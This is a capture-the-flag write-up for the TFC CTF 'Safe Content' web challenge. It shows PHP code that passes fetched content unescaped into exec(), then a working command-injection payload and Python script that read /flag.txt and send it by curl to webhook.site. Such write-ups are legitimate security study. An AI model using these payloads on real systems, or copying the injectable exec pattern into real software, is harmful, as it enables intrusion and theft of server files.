# TFC CTF WRITEUP
## SAFE CONTENT

### Web Interface
We are provided with an input in the form of a URL, and we must enter a localhost URL; other URLs are not allowed.

![Web Interface](https://github.com/byf1sh/CTF-WriteUps/blob/main/TFCCTF%20-%20Writeup/Assets/web-safecontent.png?raw=true)

### Source Code
In this challenge, we are provided with the source code in `/src.php`.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TFC Frontend</title>
    <style>
        body {
            background-color: #f9f4e9;
            font-family: Arial, sans-serif;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            text-align: center;
        }

        .header {
            font-size: 2em;
            color: #f06292; /* matching the TFC logo */
            margin-bottom: 20px;
        }

        .form-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 300px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }

        .form-group input[type="text"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #f06292;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 1em;
            cursor: pointer;
        }

        .form-group button:hover {
            background-color: #e91e63;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">TFC Content Fetcher </div>
        <div class="form-container">
            <form method="get">
                <div class="form-group">
                    <label for="url">Enter URL:</label>
                    <input type="text" id="url" name="url" required>
                </div>
                <div class="form-group">
                    <button type="submit">Fetch Content</button>
                </div>
            </form>
        </div>
    </div>

    <?php

    function isAllowedIP($url, $allowedHost) {
        $parsedUrl = parse_url($url);
        
        if (!$parsedUrl || !isset($parsedUrl['host'])) {
            return false;
        }
        
        return $parsedUrl['host'] === $allowedHost;
    }

    function fetchContent($url) {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5 // Timeout in seconds
            ]
        ]);

        $content = @file_get_contents($url, false, $context);
        if ($content === FALSE) {
            $error = error_get_last();
            throw new Exception("Unable to fetch content from the URL. Error: " . $error['message']);
        }
        return base64_decode($content);
    }

    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['url'])) {
        $url = $_GET['url'];
        $allowedIP = 'localhost';
        
        if (isAllowedIP($url, $allowedIP)) {
            $content = fetchContent($url);
            // file upload removed due to security issues
            if ($content) {
                $command = 'echo ' . $content . ' | base64 > /tmp/' . date('YmdHis') . '.tfc';
                exec($command . ' > /dev/null 2>&1');
                // this should fix it
            }
        }
    }
    ?>
</body>
</html>
```

From the code above, we can see that we can execute shell commands if we can insert the correct file, and the shell command will echo the `$content` and place it into `/tmp`. We can exploit this by inserting a payload that forces the shell to execute our content intended to read `flag.txt`.

### Crafting Payload

Since the input must include localhost in the URL, we can insert a payload like `target?url=(localhost?url=localhost/payload)` to get the flag. Since the system will read our payload as Base64, we first encode our payload into Base64.

![Crafting Payload](https://github.com/byf1sh/CTF-WriteUps/blob/main/TFCCTF%20-%20Writeup/Assets/safe%20content1.png?raw=true)

In the code above, we will read `flag.txt` with the command `cat flag.txt`, then send the output to `webhook.site` using the POST method.

### Exploitation

After creating the payload, we can directly insert the payload we created into the URL input available on the webpage. Here is the payload detail:

```
http://localhost/?url=http://localhost/YDsKY2F0IC9mbGFnLnR4dCB8IGN1cmwgaHR0cHM6Ly93ZWJob29rLnNpdGUvZDVkZTY0NzYtZDEzZS00MWRiLWI2NmQtZTI3ZTQxNGE3NTczLyAtWCBQT1NUIC1kIEAtCg==
```

Then we can directly go to our webhook to see the contents of the `flag.txt` file.

![Webhook Content](https://github.com/byf1sh/CTF-WriteUps/blob/main/TFCCTF%20-%20Writeup/Assets/webhook-safecontent.png?raw=true)

After executing the above, we successfully get the flag.

### Exploit with Python Script

```python
import base64
import requests
import urllib.parse

payload = "`;\ncat /flag.txt | curl https://webhook.site/ -X POST -d @-\n"
payload = base64.b64encode(payload.encode()).decode()
safe_string = urllib.parse.quote_plus("http://localhost/" + payload)
safe_string = urllib.parse.quote_plus("http://localhost/?url=" + safe_string)
requests.get("http://challs.tfcctf.com:30795/?url=" + safe_string)
```

---

![Evidence](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/efidence%20aladin.png?raw=true)

---

Thank you <3.